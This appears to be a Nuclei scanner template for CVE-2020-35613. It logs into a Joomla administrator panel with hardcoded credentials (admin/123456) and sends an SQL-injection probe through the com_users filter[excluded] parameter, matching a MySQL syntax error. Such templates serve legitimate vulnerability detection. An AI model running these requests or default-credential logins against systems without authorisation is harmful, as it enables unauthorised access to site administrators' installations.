id: CVE-2020-35613
info:
  author: Kien Nguyen
  classification:
    cve-id: CVE-2020-35613
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
  description: SQL injection in com_users list view
  name: SQL injection in com_users list view
  reference:
  - https://github.com/HoangKien1020/Joomla-SQLinjection
  - https://nvd.nist.gov/vuln/detail/CVE-2020-35613
  severity: critical
  tags: cve,sqli
requests:
- cookie-reuse: true
  extractors:
  - group: 1
    internal: true
    name: token
    part: body
    regex:
    - name="([a-f0-9]{32})" value="1"
    type: regex
  matchers:
  - part: body
    type: word
    words:
    - You have an error in your SQL syntax;
  raw:
  - 'GET /administrator/ HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /administrator/index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&passwd={{passwd}}&option=com_login&task=login&return=aW5kZXgucGhw&{{token}}=1

    '
  - 'GET /administrator/index.php?option=com_users&view=users&filter[excluded]=1 HTTP/1.1

    Host: {{Hostname}}

    '
variables:
  passwd: '123456'
  username: admin
